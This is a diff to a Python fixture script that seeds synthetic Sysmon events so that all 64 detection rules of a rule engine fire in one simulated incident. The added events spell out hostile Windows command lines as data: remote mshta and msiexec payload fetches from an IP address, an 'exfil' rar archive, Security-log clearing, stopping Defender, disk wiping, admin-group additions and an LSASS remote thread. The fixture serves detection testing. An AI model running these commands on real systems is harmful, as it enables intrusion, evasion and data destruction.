@@ -2,9 +2,9 @@
 """Seed one incident that exercises every rule in the corpus.
 
 seed_apt.py tells one attacker's story end to end. This script has a different
-job: it is a regression fixture and a coverage demo, built to fire all 48 rules
--- across every EventID the engine understands (1, 3, 6, 7, 10, 11, 12, 13, 17,
-20) plus a handful of EventIDs no rule keys on (8, 18, 19, 21, 22, 23) added
+job: it is a regression fixture and a coverage demo, built to fire all 64 rules
+-- across every EventID the engine understands (1, 3, 6, 7, 8, 10, 11, 12, 13,
+17, 20) plus a handful of EventIDs no rule keys on (18, 19, 21, 22, 23) added
 purely so the incident's raw event stream and process tree show the full
 breadth of what Sysmon reports -- while staying ONE incident: everything hangs
 off a single process-tree root, and no gap between events exceeds the
@@ -37,8 +37,16 @@ machine. The phases, roughly in kill-chain order:
                   │   Temp (SYS-092), a dropped payload.exe (BYOVD driver +
                   │   unmanaged PowerShell + startup persistence)
                   ├─ wmic.exe registering a WMI event consumer
-                  └─ ransomware.exe: shadow-copy deletion, a ransom note, and
-                      several .locked files
+                  ├─ ransomware.exe: shadow-copy deletion, a ransom note, and
+                  │   several .locked files
+                  └─ coverage-expansion pass: schtasks /create, a service
+                      pointed at a staged binary, a remote thread into LSASS,
+                      a firewall allow rule, wevtutil cl, a passworded rar
+                      archive, InstallUtil against a staged DLL, a remote
+                      mshta HTA, hh.exe against a staged .chm, a remote MSI,
+                      a net.exe admin-group add, sc stopping WinDefend,
+                      sdelete, cipher /w, and RDP enabled via registry
+                      (SYS-093 through SYS-107)
               └─ ftp.exe -s:script -> cmd.exe               (SYS-079)
       ├─ wmiprvse.exe          remote WMI/DCOM persistence   (SYS-078)
       ├─ PSEXESVC.exe          lateral movement arrival      (SYS-072, SYS-073)
@@ -64,7 +72,7 @@ HOST = "WKSTN-RANGE-01"
 USER = "CORP\\redteam.ops"
 BASE = datetime.now(timezone.utc) - timedelta(minutes=15)
 
-# All 48 rule IDs the corpus ships today, so main() can report exactly what
+# All 64 rule IDs the corpus ships today, so main() can report exactly what
 # (if anything) did not fire.
 EXPECTED_RULES = {
     "SYS-001", "SYS-002", "SYS-003", "SYS-004", "SYS-005", "SYS-006", "SYS-007",
@@ -74,6 +82,9 @@ EXPECTED_RULES = {
     "SYS-072", "SYS-073", "SYS-074", "SYS-075", "SYS-076", "SYS-077", "SYS-078",
     "SYS-079", "SYS-080", "SYS-081", "SYS-082", "SYS-083", "SYS-084", "SYS-085",
     "SYS-086", "SYS-087", "SYS-088", "SYS-089", "SYS-090", "SYS-091", "SYS-092",
+    "SYS-093", "SYS-094", "SYS-095", "SYS-096", "SYS-097", "SYS-098", "SYS-099",
+    "SYS-100", "SYS-101", "SYS-102", "SYS-103", "SYS-104", "SYS-105", "SYS-106",
+    "SYS-107",
 }
 
 
@@ -182,6 +193,21 @@ G = {
     "hostname": "{rng-hostname}",
     "lsass": "{rng-lsass}",
     "ransom": "{rng-ransom}",
+    # Coverage-expansion pass (SYS-093 through SYS-107).
+    "schtasks": "{rng-schtasks}",
+    "svc_installer": "{rng-svc-installer}",
+    "netsh_fw": "{rng-netsh-fw}",
+    "wevtutil": "{rng-wevtutil}",
+    "rar_archive": "{rng-rar-archive}",
+    "installutil": "{rng-installutil}",
+    "mshta_remote": "{rng-mshta-remote}",
+    "hh_help": "{rng-hh-help}",
+    "msiexec_remote": "{rng-msiexec-remote}",
+    "net_admin": "{rng-net-admin}",
+    "sc_stop": "{rng-sc-stop}",
+    "sdelete": "{rng-sdelete}",
+    "cipher_wipe": "{rng-cipher-wipe}",
+    "reg_rdp": "{rng-reg-rdp}",
 }
 
 
@@ -448,6 +474,74 @@ def events() -> list[dict]:
     ev.append(raw_event(23, step(1), Image=r"C:\Users\redteam.ops\AppData\Local\Temp\ransom.exe",
                          ProcessGuid=G["ransom"],
                          TargetFilename=r"C:\Users\redteam.ops\AppData\Local\Microsoft\Windows\Backup\catalog.wbcat"))
+
+    # === Coverage-expansion pass: SYS-093 through SYS-107, off "ops" ===
+    ev.append(proc(step(1), G["schtasks"], G["ops"], r"C:\Windows\System32\schtasks.exe",
+                    r"schtasks /create /tn WinUpdaterTask /tr "
+                    r"C:\Users\redteam.ops\AppData\Roaming\sync2.exe /sc onlogon /ru SYSTEM",
+                    pid=5100, ppid=4510))
+
+    ev.append(proc(step(1), G["svc_installer"], G["ops"], r"C:\Windows\System32\sc.exe",
+                    r"sc.exe create WinUpdSvc binPath= "
+                    r"C:\Users\redteam.ops\AppData\Local\Temp\svc.exe start= auto",
+                    pid=5110, ppid=4510))
+    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\sc.exe", ProcessGuid=G["svc_installer"],
+                         TargetObject=r"HKLM\SYSTEM\CurrentControlSet\Services\WinUpdSvc\ImagePath",
+                         Details=r"C:\Users\redteam.ops\AppData\Local\Temp\svc.exe"))
+
+    # Same payload.exe that loaded the BYOVD driver also reaches into LSASS
+    # via a remote thread rather than a memory read.
+    ev.append(raw_event(8, step(1), SourceImage=r"C:\Users\redteam.ops\AppData\Local\Temp\update.exe",
+                         SourceProcessGUID=G["payload"], TargetImage=r"C:\Windows\System32\lsass.exe",
+                         TargetProcessGuid=G["lsass"], NewThreadId="9512"))
+
+    ev.append(proc(step(1), G["netsh_fw"], G["ops"], r"C:\Windows\System32\netsh.exe",
+                    "netsh advfirewall firewall add rule name=WinUpdSvc dir=in action=allow "
+                    "protocol=TCP localport=4444", pid=5120, ppid=4510))
+
+    ev.append(proc(step(1), G["wevtutil"], G["ops"], r"C:\Windows\System32\wevtutil.exe",
+                    "wevtutil cl Security", pid=5130, ppid=4510, integrity="High"))
+
+    ev.append(proc(step(1), G["rar_archive"], G["ops"], r"C:\Program Files\WinRAR\rar.exe",
+                    r"rar.exe a -pS3cr3t99 C:\Users\redteam.ops\AppData\Local\Temp\exfil.rar "
+                    r"C:\Users\redteam.ops\Documents", pid=5140, ppid=4510))
+
+    ev.append(proc(step(1), G["installutil"], G["ops"],
+                    r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe",
+                    r"InstallUtil.exe C:\Users\redteam.ops\AppData\Local\Temp\stage6.dll",
+                    pid=5150, ppid=4510))
+
+    ev.append(proc(step(1), G["mshta_remote"], G["ops"], r"C:\Windows\System32\mshta.exe",
+                    "mshta.exe http://45.132.192.68/second.hta", pid=5160, ppid=4510))
+
+    ev.append(proc(step(1), G["hh_help"], G["ops"], r"C:\Windows\hh.exe",
+                    r"hh.exe C:\Users\redteam.ops\AppData\Local\Temp\help.chm",
+                    pid=5170, ppid=4510))
+
+    ev.append(proc(step(1), G["msiexec_remote"], G["ops"], r"C:\Windows\System32\msiexec.exe",
+                    "msiexec.exe /i http://45.132.192.68/pkg.msi /qn", pid=5180, ppid=4510))
+
+    ev.append(proc(step(1), G["net_admin"], G["ops"], r"C:\Windows\System32\net.exe",
+                    "net.exe localgroup administrators redteam.ops /add", pid=5190, ppid=4510))
+
+    ev.append(proc(step(1), G["sc_stop"], G["ops"], r"C:\Windows\System32\sc.exe",
+                    "sc.exe stop WinDefend", pid=5200, ppid=4510, integrity="High"))
+
+    ev.append(proc(step(1), G["sdelete"], G["ops"],
+                    r"C:\Users\redteam.ops\AppData\Local\Temp\sdelete64.exe",
+                    r"sdelete64.exe -p 3 -z C:", pid=5210, ppid=4510, integrity="High"))
+
+    ev.append(proc(step(1), G["cipher_wipe"], G["ops"], r"C:\Windows\System32\cipher.exe",
+                    r"cipher.exe /w:C:\Users\redteam.ops\AppData\Local\Temp",
+                    pid=5220, ppid=4510))
+
+    ev.append(proc(step(1), G["reg_rdp"], G["ops"], r"C:\Windows\System32\reg.exe",
+                    r"reg add \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" "
+                    r"/v fDenyTSConnections /t REG_DWORD /d 0 /f",
+                    pid=5230, ppid=4510))
+    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\reg.exe", ProcessGuid=G["reg_rdp"],
+                         TargetObject=r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections",
+                         Details="DWORD (0x00000000)"))
 
     # === FTP LOLBAS execution, off "ops" ===
     ev.append(proc(step(2), G["ftp"], G["ops"], r"C:\Windows\System32\ftp.exe",
